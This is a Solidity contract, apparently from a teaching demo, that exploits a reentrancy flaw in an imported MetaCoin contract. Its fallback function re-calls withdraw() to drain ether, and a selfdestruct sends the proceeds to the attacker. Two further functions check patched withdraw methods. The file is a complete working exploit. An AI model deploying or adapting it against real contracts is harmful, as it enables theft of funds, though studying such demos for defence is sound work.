pragma solidity ^0.4.8;

import "./MetaCoin.sol";

/**
 * @title ReEntrancy Exploit
 * @dev We make the callback method to run reccursively
 * @dev before them making the state change
 * @dev there by allowing us to steal all their ether!
**/
contract MetaCoinEx {
  MetaCoin public metacoin;

  /**
   * @dev Initialize with the victim contract.
  **/	  
  function MetaCoinEx (address _metacoin) public payable {
    metacoin = MetaCoin(_metacoin);
  }

  /**
   * @dev Payback time. Extract all money to attacker wallet.
  **/	  
  function bailOut () public {
    selfdestruct(msg.sender);
  }

  /**
   * @dev Attack time. 
   * Deposit a small amount and try withdrawing it causing the 
   * callback method to trigger.
  **/  
  function withdraw() public payable {
    metacoin.deposit.value(msg.value)();
    metacoin.withdraw();
  }

  /**
   * @dev Call the fixed method to verify the fix works.
  **/
  function withdrawFix1() public payable {
    metacoin.deposit.value(msg.value)();
    metacoin.withdrawFix1();
  }  
  
  /**
   * @dev Call the fixed method to verify the fix works.
  **/
  function withdrawFix2() public payable {
    metacoin.deposit.value(msg.value)();
    metacoin.withdrawFix2();
  }    

  /**
   * @dev Crux of the exploit. Recursively call the withdraw method.
  **/  
  function () public payable {
    if (metacoin.balance >= msg.value) {
      metacoin.withdraw();
    }
  }
}
